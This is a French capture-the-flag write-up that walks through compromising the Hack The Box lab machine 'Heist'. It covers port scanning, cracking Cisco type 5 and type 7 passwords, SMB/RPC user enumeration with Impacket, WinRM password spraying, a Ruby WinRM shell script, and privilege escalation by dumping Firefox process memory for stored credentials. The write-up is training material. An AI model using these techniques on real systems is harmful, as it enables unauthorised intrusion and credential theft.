# 10.10.10.149

# Reco

`ping 10.10.10.149`

```
PING 10.10.10.149 (10.10.10.149) 56(84) bytes of data.
64 bytes from 10.10.10.149: icmp_seq=1 ttl=127 time=291 ms
64 bytes from 10.10.10.149: icmp_seq=2 ttl=127 time=508 ms
```

`sudo nmap -Pn -sS -vvv -p- -oA nmap/10.10.10.149_sS 10.10.10.149`
```
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

`sudo nmap -Pn -sV -vvv -p80,135,445,5985,49669 -oA nmap/10.10.10.149_sV 10.10.10.149`
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

# Ports
## HTTP (80/TCP)

- `Dirb` et `Gobuster` avec 2 wordlist différentes identifis les élements suivants : 

```
http://10.10.10.149/attachments/
http://10.10.10.149/attachments/config.txt (Status: 200)
```

- En utilisant le navigateur on découvre ces pages

```
http://10.10.10.149/login.php
http://10.10.10.149/issues.php
http://10.10.10.149/errorpage.php
http://10.10.10.149/attachments/config.txt
```

- `issues.php` est accessible via login.php en tant que `Guest`, un des utilisateur s'appelle `Hazard`
- `/attachments/config.txt` est un fichier de config Cisco

```
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

- Pour secret 5 on peut utiliser Hashcat/JTR : 

`hashcat -m 500 -a 0 hashes /opt/wordlists/rockyou.txt --force`

```
1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

`john hashes.jtr --wordlist=/opt/wordlists/rockyou.txt`

```
sealth1agent    (type5)
```

- Pour password 7 on utilise :
    - http://www.ifm.net.nz/cookbooks/passwordcracker.html
    - https://www.frameip.com/decrypter-dechiffrer-cracker-password-cisco-7/

```
0242114B0E143F015F5D1E161713 : $uperP@ssword
02375012182C1A1D751618034F36415408 : Q4)sJu\Y8qz*A3?d
```

### Connaissances Cisco

- Le paramètre de commande `password` est à bannir
`enable secret`est toujours prioritaire sur `enable password`

```
  -> Indicates MD5 algorithm
 |   -> Salt
 |  |     -> Salt + Password Hash
 |  |    |
$1$mERr$RchIrJirmCXltFBZ2l50l/
```

- Cisco Type 5 Password: These passwords are stored as MD5 UNIX hashes which are salted. Most secure.
- Cisco Type 7 Password: These passwords are stored in a Cisco defined encryption algorithm. Not secure except for protecting against shoulder surfing 
	- L’algorithme Cisco “Type 7” est une implémentation de l’algorithme de Vigenere

## RPC (135/TCP)

`rpcclient -U "" 10.10.10.149`

```
Unable to initialize messaging context
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

- On utilise le nom d'utilisateur `Hazard` à cause de ce qui est marqué sur le forum `Also, please create an account for me on the windows server as I need to`, on l'associe au dernier mot de passe trouvé


- Le compte Hazard peut se connecter en RPC et récupérer certaines informations

`rpcclient -U "hazard%stealth1agent" 10.10.10.149`

```
Unable to initialize messaging context
rpcclient $> srvinfo
	10.10.10.149   Wk Sv NT SNT         
	platform_id     :	500
	os version      :	10.0
	server type     :	0x9003

rpcclient $> getusername
Account Name: Hazard, Authority Name: SUPPORTDESK

rpcclient $> lookupnames Hazard
Hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
```

- On peut utiliser l'outil de `Impacket` `rpcdump` :

`sudo rpcdump.py Hazard:stealth1agent@10.10.10.149`

### SMB (445/TCP)

- On utilise le nom d'utilisateur `Hazard` à cause de ce qui est marqué sur le forum `Also, please create an account for me on the windows server as I need to`, on l'associe au dernier mot de passe
trouvé


- Le compte Hazard peut se connecter en SMB, mais n'est pas administrateur car il n'a pas les droits d'écritures sur `C$` ou `ADMIN$`
- Il peut simplement lire les fichiers de `IPC$`


`sudo smbclient \\\\10.10.10.149\\IPC$ -U Hazard%stealth1agent`
```
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
```

`smbmap -H 10.10.10.149 -u Hazard -p stealth1agent`

```bash
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: 10.10.10.149                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
```

`sudo psexec.py Hazard:stealth1agent@10.10.10.149 whoami`

```bash
[sudo] Mot de passe de audit : 
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Requesting shares on 10.10.10.149.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

`smbmap -H 10.10.10.149 -u Hazard -p stealth1agent -s IPC$ -R 'IPC$\'`

```bash
-r--r--r--                3 Mon Jan  1 00:09:21 1601	InitShutdown
-r--r--r--                4 Mon Jan  1 00:09:21 1601	lsass
[...]	
-r--r--r--                1 Mon Jan  1 00:09:21 1601	PSHost.132165790869132972.5328.DefaultAppDomain.wsmprovhost
-r--r--r--                1 Mon Jan  1 00:09:21 1601	IISFCGI-6ea1fdcc-b132-4ba9-b0d9-1773040bf5c9
```

### WinRM (5985/TCP)

- Le compte de `Hazard` marche sur SMB et RPC mais pas sur WinRM, or WinRM est le seul service qui nous permettrai d'avoir un reverse shell


- On cherche d'autre compte : 

`sudo lookupsid.py Hazard:stealth1agent@10.10.10.149`

```bash
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

- On va brute force en associant l'ensemble des trois comptes (support, Chase, Jason) et des trois mots de passes : 

```
msf5 auxiliary(scanner/winrm/winrm_login) >
PASS_FILE         /.../Heist/pass.list
USER_FILE         /.../Heist/user.list
RHOSTS            10.10.10.149
DOMAIN            SUPPORTDESK
msf5 auxiliary(scanner/winrm/winrm_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.149:5985 - LOGIN FAILED: SUPPORTDESK\support:support (Incorrect: )
[-] 10.10.10.149:5985 - LOGIN FAILED: SUPPORTDESK\support:stealth1agent (Incorrect: )
[...]
[-] 10.10.10.149:5985 - LOGIN FAILED: SUPPORTDESK\Chase:$uperP@ssword (Incorrect: )
[+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d
```

On se connecte :

```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.149:5985/wsman',
  user: 'Chase',
  password: 'Q4)sJu\Y8qz*A3?d',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
``` 

`ruby winrm-shell.rb`
```
PS > whoami
supportdesk\chase
```

# Elevation de priviléges

`PS > type Desktop\todo.txt`
```
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.
Done:
1. Restricted access for guest user.
```

- On comprends que la liste des issues est vérifiée à travers un navigateur
- On vois que FFX est installé sur la box
    - L'utilisateur `chase` possède un profile dans FFX

`*Evil-WinRM* PS C:\users\chase\appdata\roaming\Mozilla\Firefox\Profiles>`
    
- Sur les versions récentes de FFX le manager de MDP stock les identifiants chiffrés dans `logins.json` et la clé de chiffrement dans `key4.db`
- Les deux fichiers sont stockés dans `C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles `
- Quand aucun mot de passe master n'est définis les MDP peuvent être retrouvés

- On dump la mémoire du processus firefox : `.\procdump64.exe -accepteula -ma <PID>`

- On extrait les chaînes de caractéres du dump : `cmd /c "strings64.exe -accepteula <FILE>.dmp > <OUTPUT>.txt"`

- Et on y recherche le mot clé `password` : `findstr "password" ./<OUTPUT>.txt`

```
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

- Le shell WinRM marche avec le compte `administrator/4dD!5}x/re8]FBuZ`

# Proof

- User : a127daef77aXXXXXXXXXX653295f59c4
- Root : 50dfa3c6bfd20e2e0d071XXXXXXXXXX7